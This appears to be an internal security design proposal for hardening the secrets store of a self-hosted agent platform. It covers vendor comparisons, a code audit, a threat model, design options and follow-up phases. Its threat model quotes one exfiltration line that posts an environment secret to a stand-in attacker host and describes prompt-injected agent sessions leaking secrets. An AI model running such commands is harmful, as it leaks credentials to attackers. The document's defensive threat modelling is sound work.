# Secrets proposal: hardened, still usable (Sprint 6, obj 900498)

**For:** Operator · **Status:** proposal plus a first PR. The PR ships only the uncontroversial parts; everything else waits for the decisions in §5.
**Short version:** the native store's foundations are sound: AES-256-GCM, scoped, versioned, write-only in the UI, with use-without-reveal through the broker. The real exposure is in three other places. (1) The master key sits where sessions can read it. (2) Every session receives *every* secret its workspace can see as plain environment variables. (3) Anything that can `docker exec` can decrypt the whole store without leaving a trace. Fix those three first. Reveal and 1Password come after.

---

## 1. How the leaders do it (research summary; full table in Appendix A)

| | At rest | Can a human see the value again? | Audit | How it reaches runtime |
|---|---|---|---|---|
| **GitHub Actions** | Client-side libsodium sealed box | **Never.** No read API. | Writes only | Env inside the job. Exact-match log masking. |
| **Vercel** | Encrypted | "Secret" type: **never** after save. Rotate = overwrite. | Changes only | Env. Build logs redact values. |
| **Railway** | Envelope encryption: per-variable keys wrapped by a separate key | "Sealed" vars: **never**, and never copied to PR envs or diffs | Changes (who/when) | Env at deploy |
| **Doppler** | AES-GCM with a per-workplace key wrapped by an HSM/KMS key; optional customer KMS | Yes, **click-to-reveal**. Each reveal is logged. | Immutable change log **plus** a separate per-secret *read* log | `doppler run` env, syncs |
| **Supabase Vault** | libsodium AEAD; row metadata bound as associated data; root key outside the DB | Any role granted the view | Postgres logs only | SQL at use time |
| **1Password** | End-to-end; the vendor never holds a usable key | Yes, in the unlocked app (re-auth handled by 1P) | Events API: item usage, audit events | `op://` references resolved at runtime. `op run` **masks output by default.** |

**What the leaders agree on:**
1. Use envelope encryption: a per-secret data key (DEK) wrapped by a key-encryption key (KEK) that is never stored next to the data.
2. Default to **write-only**. Rotation means overwriting.
3. Log **reads separately from writes**, and log a read only when plaintext actually leaves the server.
4. Prefer **references resolved at runtime** over copied plaintext.
5. Treat reveal as a privileged act behind step-up re-auth ("sudo mode", 5–15 min).
6. Agents and API principals never get a reveal path.

## 2. Current state of Operation Kit (audited from the code on `main`, 2026-11-11)

| Area | Today | File |
|---|---|---|
| Storage | `secrets` table in SQLite. One row per (scope, workspace, user, key). Scopes are global / workspace / user / workspace_user; the most specific wins. | `db/schema/secrets.ts` |
| Encryption | AES-256-GCM, random 12-byte IV, auth tag. **One** master key for every row. **No envelope** and **no AAD**, so ciphertexts are not bound to their row or key name. | `services/secrets-crypto.ts` |
| Master key | `SECRETS_MASTER_KEY` env var, or the file `/home/operator/projects/.secrets-master-key`, which lives **inside the projects mount that sessions also see**. Cached in process memory. No rotation path. | `secrets-crypto.ts` |
| Who can read values | No HTTP route returns a value. Only five server paths decrypt: spawn injection, the broker, the redaction registry, a few server jobs, and `scripts/secrets-get.ts`. | `routes/secrets.ts`, grep of `decryptSecret` |
| Who can manage | Global admin: everything. Workspace member: their workspaces. User: their own `user` scope. Checked server-side on every route. | `canAccessScope` |
| Delivery to agents | **Push:** at spawn, *every* resolved secret for (workspace, user) goes into the session env. Service-only, seat and webhook keys are excluded. This session received ~370. **Pull:** the broker (`{{secret:NAME}}` placeholders, host allowlist) uses a value without revealing it. | `session-spawn-env.ts`, `secrets-broker.ts` |
| Leak containment | Known-value plus pattern redaction on transcripts, DB writes, file APIs and broker responses. `JWT_SECRET` is stripped from session env. Owner-pasted keys are captured out of chat into the store and flagged for rotation. | `secret-redaction.ts`, `chat-secret-capture.ts` |
| Audit | `secret_access_log` records create / update / delete / rollback / read / inject / use. It was **not tamper-evident**, had no per-secret view, and recorded no source. Broker uses also go to `activity_log`. | `secrets-store.ts` |
| History | Every version kept encrypted. Rollback re-applies an old ciphertext as a new version. | `secret_versions` |
| UI | Values shown as `••••••`. Editing meant re-typing the value through the create-or-update upsert. No description, no last-used, no audit view. | `SecretsPage.tsx` |
| Other credential stores | GitHub PATs and Google tokens use `crypto.ts` (AES-GCM under a *different* key). Agent API keys are hashed. Test creds have their own key. | `services/crypto.ts` |
| Backups | `backup-db.sh` copies the DB (ciphertext only). The key is not in the backup, which is correct, but nothing documents backing the key up separately. | `scripts/backup-db.sh` |

### Threat model

| # | Threat | Today | Gap → fix |
|---|---|---|---|
| T1 | DB file or backup leaked | Protected (AES-GCM; key not in backup) | Key loss = total loss. Document an off-box key escrow. |
| T2 | **Session reads the key file**, then decrypts everything | **Exposed.** The key path is under the session-visible projects mount, and sessions share the server's uid. | Move the KEK out of every session-visible path (§4, D2). |
| T3 | **Session / prompt injection exfiltrates env** | **Exposed.** Hundreds of live values sit in every session env. Redaction catches transcripts but not `curl evil.com -d "$KEY"`. | Allowlist injection per agent/card. Broker by default for the rest (D4). |
| T4 | Anything with the **Docker socket** runs `docker exec … secrets-get.ts` | Exposed, and unaudited (logs `read` with actor null) | Socket-less member sessions (already on the roadmap). Tag `secrets-get` reads `source=cli`. |
| T5 | Admin account takeover through the web UI | Values are not revealable, so the attacker can only overwrite or delete. Overwrites and deletes are now audited **append-only**. | Passkey MFA for admins (Sprint 4b/auth). |
| T6 | Malicious insider edits the audit trail | Was possible | **Fixed in this PR:** DB triggers block UPDATE/DELETE. |
| T7 | Ciphertext swapped between rows (DB write access) | Possible, because there is no AAD | AAD = (row id, scope, key) under envelope encryption (D2 phase). |
| T8 | Stale or compromised value nobody rotates | Rotation flags exist for chat-pasted keys only | **This PR:** rotate flow, last-used, descriptions. Next: age reminders. |

## 3. Options

**A. Harden the native store (recommended core).** Works on every install, no new vendor.
- Envelope encryption: per-secret DEK, AES-256-GCM with AAD = `id|scope|key`, `kek_id` per row, re-wrap-only KEK rotation.
- The KEK leaves the session-visible filesystem: a key file mounted read-only into the *server* only, systemd-creds on hosts that have it, or an optional cloud KMS.
- Injection goes from "all" to **allowlist**: secrets the card's agent profile or skill declares. Everything else through the broker.
- Optional *revealable* class, gated by step-up re-auth (D1).
- Cost: ~2 sprints. A one-time migration re-wraps existing ciphertexts (decrypt with the old key, encrypt under a DEK) inside one transaction, with a verified backup first.

**B. 1Password as an optional provider (recommended as a plug-in, not a replacement).**
- A store row may hold an `op://vault/item/field` reference instead of ciphertext. The server resolves it at spawn or broker time through a vault-scoped, read-only **service account**.
- 1Password gives E2E encryption, its own reveal re-auth in the 1P app, and Events-API audit.
- Downsides: a 1P outage blocks spawns (cache wrapped values with a TTL). The service-account token is the new secret-zero; keep it under the KEK from option A. It costs 1P seats. OSS installs still need option A.

**C. Replace the store with Vault / Infisical / Doppler-style SaaS.**
- Not recommended. We just retired Doppler (Aug 2026). Vault is heavy for one VPS (unsealing, HA). It adds a hard dependency to every self-hosted install.

**Recommendation:** A now, B as an opt-in provider interface once A's envelope work lands. A's provider seam (`value_ref` vs `value_encrypted`) is what makes B cheap.

## 4. Recommended design (target state)

1. **Encryption.** Envelope (DEK per secret, wrapped by a KEK) with AAD binding. `kek_id` per row. KEK rotation re-wraps DEKs only.
2. **KEK location** (choose in D2). Default: a host file outside every session-visible mount, mounted read-only into the server container only, with an escrow copy off-box. Optional: AWS/GCP KMS unwrap at boot, or a 1P-held KEK.
3. **Write-only by default.** Reveal exists only for secrets explicitly created as *revealable*, and only after:
   - a fresh passkey/WebAuthn assertion (`userVerification: required`), or password re-entry as fallback;
   - a 5-minute sudo window;
   - owner/admin cookie sessions only, never agent keys, bearer tokens or sessions;
   - a rate limit of 10 per hour;
   - every reveal written to the audit log **and** raised in the AlertBell.
   - If Cloudflare Access fronts the install, also require a fresh CF Access JWT (`iat` < 5 min).
4. **Delivery.** Sessions get only allow-listed names in env. The broker serves everything else by placeholder (exists today). Each session gets a scoped HMAC token (exists today). Output masking stays on.
5. **Audit.** Append-only log of every write, use and reveal attempt, with source. **Done in this PR.** Next: export to the vault or KB daily, and a hash chain (each row stores `sha256(prev_hash || row)`) for tamper *evidence* beyond the trigger.
6. **Lifecycle.**
   - Done in this PR: descriptions, last-used, rotate-without-reveal, version rollback.
   - Next: owner and expiry date per secret, a "stale > 90 days" badge, rotate-in-place auto-resolving rotation flags.

## 5. Decisions for Operator

| # | Decision | Options | Rec |
|---|---|---|---|
| **D1** | Can a human ever see a stored value again? | (a) Never: write-only like GitHub/Vercel. (b) Opt-in *revealable* secrets behind passkey/password re-auth plus audit plus alert. | **(b), off by default.** Most secrets stay write-only. |
| **D2** | Where does the KEK live? | (a) Host file outside session mounts (free, all installs). (b) Cloud KMS (~$1/mo, needs an IAM key on the box). (c) 1Password-held KEK (needs a 1P service account). | **(a) as default, (b)/(c) optional.** (a) closes T2 by itself. |
| **D3** | 1Password? | (a) No. (b) Optional per-workspace provider (`op://` refs). (c) Make 1P the store. | **(b)**, after A. |
| **D4** | What goes into a session env? | (a) Everything in scope (today). (b) Allowlist per agent profile/skill, broker for the rest. | **(b)**, with a migration mode that logs which un-listed names a session tried to use. |
| **D5** | Audit retention | Forever / 1 year + export | **1 year in DB, then export.** Pruning requires dropping the trigger on purpose. |

## 6. What this PR ships (uncontroversial, no key or data changes)

- **Masking everywhere.** No list or other endpoint returns a value or ciphertext. A sweep test pins this for every `/api/secrets` route.
- **Edit/rotate.** `POST /api/secrets/rotate` replaces the value of an *existing* secret; it never creates one, so a typo fails loudly. The old value stays encrypted in history for rollback. Descriptions are set on create or through `PATCH /api/secrets/metadata`. **Last used** is stamped on spawn injection, broker use and server reads.
- **Append-only audit log.** SQLite triggers abort any UPDATE or DELETE. New `secret_id`, `source` and `detail` columns. `GET /api/secrets/audit` is filterable and paginated: admins see the whole log, members see the history of secrets they can access. `POST /api/secrets/reveal` is always refused and always audited, so attempts are visible before reveal exists. There is an admin **Audit log** panel and per-secret **Activity** in History.
- **`docs/security.md`.** A user-facing Security section and a self-hoster hardening checklist.
- **Backward compatible.** Existing `POST /api/secrets`, list, `/versions`, `/access-log`, `/move` and `/rollback` contracts are unchanged; responses only gain fields. Sprint 4b/5 provider-key writes keep working.

## 7. Follow-up plan (after Operator decides)

| Phase | Work | Depends on |
|---|---|---|
| F1 | Move the KEK out of the session-visible path; document key escrow; `secrets-get` audits as `source=cli` | D2 |
| F2 | Envelope encryption + AAD + `kek_id`; one-time re-wrap migration (backup, transaction, verify-decrypt-all, keep the old key 30 days) | D2 |
| F3 | Allowlist injection + "would-have-used" telemetry mode, then enforce | D4 |
| F4 | Revealable class + WebAuthn/password step-up + sudo window + AlertBell | D1, Sprint 4b passkeys |
| F5 | 1Password provider (`value_ref`, service account, Events API ingest) | D3, F2 |
| F6 | Audit hash chain + daily export; stale/expiry badges | D5 |

---

## Appendix A: vendor detail

- **Railway.** Env vars are envelope-encrypted, with per-variable keys wrapped by a separate key. Sealed variables cannot be read from the UI, API or CLI and cannot be un-sealed. They are excluded from PR environments, duplicates and diffs. The workspace audit log is exportable through GraphQL. No customer KMS. Railway disclosed an env-var access incident in Oct 2026 (details unverified), a reminder that rotation tooling matters as much as encryption.
- **Supabase Vault.** libsodium AEAD with the other columns as associated data. The root key is held outside Postgres. pgsodium is being deprecated while keeping the Vault API. There is no reveal concept and no read audit: whoever can SELECT the decrypted view sees plaintext.
- **Doppler.** Per-workplace AES-GCM keys exist only in memory, wrapped by a GCP KMS HSM key; Enterprise Key Management (EKM) is optional. Tokenization keeps plaintext out of web and DB tiers. Service tokens are scoped to one config, read-only by default, optionally TTL'd, shown once. Access logs record per-secret reads (only when the value is returned). Click-to-reveal.
- **Vercel.** Two types, *Config* (readable) and *Secret* (write-only, formerly "Sensitive"). You cannot convert a Secret back to Config; to change it you supply a new value. Logs redact Secret values (≥32 chars). An optional team policy separates production values.
- **GitHub Actions.** The client seals values with libsodium to the repo/org/env public key. Secrets are strictly write-only. Scopes are org (all/private/selected repos) → repo → environment; environment protection rules gate access. Secrets are not passed to fork PRs. Logs are masked by exact match, and `::add-mask::` handles derived values. OIDC is recommended over long-lived keys.
- **1Password.** E2E: Connect, the SDK and the CLI decrypt client-side. Service-account tokens carry the unlock key, are vault-scoped, and cannot be edited, only rotated or revoked. `op run` injects env into a subprocess and masks values in output by default. Events API: item usage plus audit events (120-day window).

Sources: docs.railway.com/guides/variables · docs.railway.com/enterprise/security · supabase.com/docs/guides/database/vault · docs.doppler.com/docs/security-fact-sheet · docs.doppler.com/docs/access-logs · docs.doppler.com/docs/service-tokens · vercel.com/docs/environment-variables/sensitive-environment-variables · docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions · docs.github.com/en/rest/guides/encrypting-secrets-for-the-rest-api · 1password.dev/service-accounts/security · 1password.dev/cli/reference/commands/run · 1password.dev/events-api/reference · freedesktop.org systemd-creds(1).

## Appendix B: KEK options for a single self-hosted VPS

| Option | Protects against | Cost / risk |
|---|---|---|
| Key file (status quo) | DB-only leak | Readable by anything on the same uid/mount. That includes sessions today. |
| Key file outside session mounts, read-only into the server container only | DB leak **and** casual session reads | Free. Still readable by host root or the Docker socket. |
| systemd-creds (host key; TPM2 if present) | Above, plus the credential is name-bound and root-only | DigitalOcean droplets usually have no vTPM; awkward with Docker. |
| Cloud KMS unwrap (AWS/GCP) | Above, plus instant revoke and KMS-side audit | Needs a bootstrap IAM key on the box; network dependency at boot. |
| HashiCorp Vault Transit | Same as KMS, self-hosted | Heavy for one node (unseal, HA). |
| 1Password-held KEK (`op read` at boot) | Same as KMS, with 1P audit | The secret-zero is the `ops_` token; 1P outage at boot. |

## Appendix C: step-up re-auth pattern (for F4)

1. `POST /api/secrets/reveal/challenge {secretId}` returns a WebAuthn challenge bound to `(userId, secretId, action='reveal', exp=60s)`.
2. The browser calls `navigator.credentials.get({ userVerification: 'required' })`.
3. `POST /api/secrets/reveal` with the assertion. The server verifies it, opens a 5-minute sudo window, and returns the value once with `Cache-Control: no-store`. It writes `reveal` to the audit log and raises an AlertBell notice to all admins.
4. Password re-entry is the fallback when no passkey is registered. If Cloudflare Access is present, also require a CF JWT with `iat` under 5 minutes.
5. Never offered to bearer, agent-key or session principals. A rate limit applies.
